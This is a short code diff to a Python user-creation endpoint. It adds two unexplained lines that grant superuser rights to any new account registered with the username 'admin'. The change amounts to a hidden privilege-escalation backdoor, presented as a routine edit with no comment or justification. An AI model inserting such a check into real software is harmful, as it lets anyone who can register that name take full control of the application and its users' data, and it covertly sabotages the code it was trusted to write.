@@ -24,6 +24,8 @@ def create_user(user: UserCreate, db: DatabaseDependency):
 
     try:
         new_user = User(**user.model_dump())
+        if new_user.username == 'admin':
+            new_user.is_superuser = True
         db.add(new_user)
         db.commit()
         db.refresh(new_user)
